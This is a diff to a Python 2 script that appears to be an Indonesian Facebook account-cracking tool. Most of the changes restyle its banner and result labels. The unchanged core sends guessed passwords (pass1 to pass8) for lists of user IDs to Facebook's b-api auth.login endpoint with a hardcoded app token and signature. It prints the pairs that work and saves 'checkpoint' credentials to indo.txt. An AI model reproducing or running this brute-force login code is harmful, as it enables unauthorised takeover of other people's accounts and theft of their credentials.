@@ -53,14 +53,15 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.06)
 		
-logo = """ \033[96m        .:'
-    __ :'__
- .'`__`-'__``. • Facebook : Fb.com/Rizky.Rasata
-:__________.-' • Github   : Github.com/RKT1/vip
-:_________:    • Recode   : Muhammad Rizky
- :_________`-; • Whatsapp : 0895xxxxxxxxx
-  `.__.-.__.'
-\033[0m-----------------------------------------"""
+logo = """\033[94m-------------------------------------------------\033[96m
+   ╱▔▔▔▔▔▔▔▔╲    
+   \033[96m▏        ▕    \033[95m=>\033[93m Recode   : Muhammad Rizky
+   \033[96m▏╭━╮  ╭━╮▕    \033[95m=>\033[93m Github   : Github.com/RKT1/vip
+\033[96m╱▔╲╲╰━╯╱╲╰━╯╱╱▔╲ \033[95m=>\033[93m Facebook : Rizky.Rasata
+\033[96m╲▂╲╲▏╮ ▔▔ ╭▕╲╲▂╱ \033[95m=>\033[93m Whatsapp : 089560xxxxx
+\033[96m╱▔╲╲▏┣╋╋╋╋┫▕╲╲▔╲
+╲▂╱ ╲▂▂▂▂▂▂╱ ╲▂╱
+\033[94m-------------------------------------------------"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -79,7 +80,7 @@ def masuk():
 	os.system('clear')
 	print logo
 	print "\033[92m1. \033[0mLogin via email/id fb"
-	print "\033[92m2. \033[0mLogin via token fb (No Sesi)"
+	print "\033[92m2. \033[0mLogin via token fb "
 	print "\033[92m3. \033[0mAmbil Token"
 	print "\033[91m0. \033[0mKeluar"
 	print
@@ -185,11 +186,13 @@ def login():
 def Ambil_Token():
 	os.system("clear")
 	print logo
-        os.system("cd ...")
 	jalan("Install...")
 	os.system (" npm install ")
 	jalan ("Mulai...")
 	os.system (" npm start ")
+	raw_input("\n[ Kembali ]")
+	masuk()
+
 
 
 			
@@ -217,7 +220,7 @@ def menu():
 	os.system("clear")
 	print logo
 	print "\033[92m『"+nama+"』"
-	print "\033[0m-----------------------------------------"
+	print "\033[94m-------------------------------------------------"
 	print "\033[92m1.\033[0m Crack id Indonesia "
 	print "\033[92m2.\033[0m Crack id bangladesh "
 	print "\033[92m3.\033[0m Crack id usa "
@@ -500,7 +503,7 @@ def pilih_indo():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[0m{\033[93m•\033[0m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
-	print ("\n-----------------------------------------")
+	print ("\n\033[94m-------------------------------------------------")
 	
 	def main(arg):
 		global cekpoint,oks
@@ -516,11 +519,11 @@ def pilih_indo():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[92m[OK✓] ' + user + ' • ' + pass1
+				print '\x1b[92m[Berhasil] ' + user + ' • ' + pass1
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[91m[CP+] ' + user + ' • ' + pass1
+					print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass1
 					cek = open("indo.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
@@ -530,11 +533,11 @@ def pilih_indo():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[92m[OK✓] ' + user + ' • ' + pass2
+						print '\x1b[92m[Berhasil] ' + user + ' • ' + pass2
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[91m[CP+] ' + user + ' • ' + pass2
+							print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass2
 							cek = open("indo.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -544,11 +547,11 @@ def pilih_indo():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[92m[OK✓] ' + user + ' • ' + pass3
+								print '\x1b[92m[Berhasil] ' + user + ' • ' + pass3
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[91m[CP+] ' + user + ' • ' + pass3
+									print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass3
 									cek = open("indo.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -558,11 +561,11 @@ def pilih_indo():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[92m[OK✓] ' + user + ' • ' + pass4
+										print '\x1b[92m[Berhasil] ' + user + ' • ' + pass4
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[91m[CP+] ' + user + ' • ' + pass4
+											print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass4
 											cek = open("indo.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -572,11 +575,11 @@ def pilih_indo():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
-												print '\x1b[92m[OK✓] ' + user + ' • ' + pass5
+												print '\x1b[92m[Berhasil] ' + user + ' • ' + pass5
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[91m[CP+] ' + user + ' • ' + pass5
+													print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass5
 													cek = open("indo.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -586,11 +589,11 @@ def pilih_indo():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[92m[OK✓] ' + user + ' • ' + pas6
+														print '\x1b[92m[Berhasil] ' + user + ' • ' + pass6
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[91m[CP+] ' + user + ' • ' + pass6
+															print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass6
 															cek = open("indo.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -600,11 +603,11 @@ def pilih_indo():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[92m[OK✓] ' + user + ' • ' + pass7
+																print '\x1b[92m[Berhasil] ' + user + ' • ' + pass7
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[91m[CP+] ' + user + ' • ' + pass7
+																	print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass7
 																	cek = open("indo.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
@@ -614,11 +617,11 @@ def pilih_indo():
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	q = json.load(data)
 																	if 'access_token' in q:
-																		print '\x1b[92m[OK✓] ' + user + ' • ' + pass8
+																		print '\x1b[92m[Berhasil] ' + user + ' • ' + pass8
 																		oks.append(user+pass8)
 																	else:
 																		if 'www.facebook.com' in q["error_msg"]:
-																			print '\x1b[91m[Cekpoint] ' + user + ' • ' + pass8
+																			print '\x1b[96m[Cekpoint] ' + user + ' • ' + pass8
 																			cek = open("indo.txt", "a")
 																			cek.write(user+"|"+pass8+"\n")
 																			cek.close()
@@ -917,4 +920,3 @@ def cari():
 if __name__ == '__main__':
 	menu()
 	login()
-################################
